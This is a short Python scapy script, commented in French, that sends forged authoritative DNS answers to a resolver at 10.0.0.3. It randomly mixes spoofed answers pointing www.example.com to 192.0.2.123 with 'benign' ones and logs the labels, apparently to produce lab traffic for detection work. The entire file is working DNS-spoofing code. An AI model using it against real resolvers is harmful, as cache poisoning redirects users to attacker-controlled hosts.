from scapy.all import *
import time
import random

def generate_dns_traffic(dst_ip, qname, fake_ip, num_packets=500):  # Changez ici de 100 à 500
    txid = 1000
    with open('dns_traffic_log.txt', 'w') as log_file:
        for i in range(num_packets):
            packet_type = "malicious" if random.choice([True, False]) else "benign"
            
            if packet_type == "malicious":
                # Créer une réponse DNS malveillante
                dns_response = IP(dst=dst_ip)/UDP(dport=53)/DNS(
                    id=txid,
                    qr=1,  # Indiquer qu'il s'agit d'une réponse
                    aa=1,  # Authoritative Answer
                    qd=DNSQR(qname=qname),
                    an=DNSRR(rrname=qname, ttl=86400, rdata=fake_ip)
                )
            else:
                # Créer une réponse DNS légitime
                dns_response = IP(dst=dst_ip)/UDP(dport=53)/DNS(
                    id=txid,
                    qr=1,  # Indiquer qu'il s'agit d'une réponse
                    aa=1,  # Authoritative Answer
                    qd=DNSQR(qname=qname),
                    an=DNSRR(rrname=qname, ttl=86400, rdata='93.184.216.34')  # Legitimate IP
                )

            send(dns_response, verbose=0)
            log_file.write(f"{time.time()}, {packet_type}\n")
            txid += 1

if __name__ == "__main__":
    target_dns_resolver = "10.0.0.3"  # IP du résolveur DNS
    generate_dns_traffic(target_dns_resolver, "www.example.com", "192.0.2.123")  # Ici aussi, vous pouvez spécifier le nombre si nécessaire
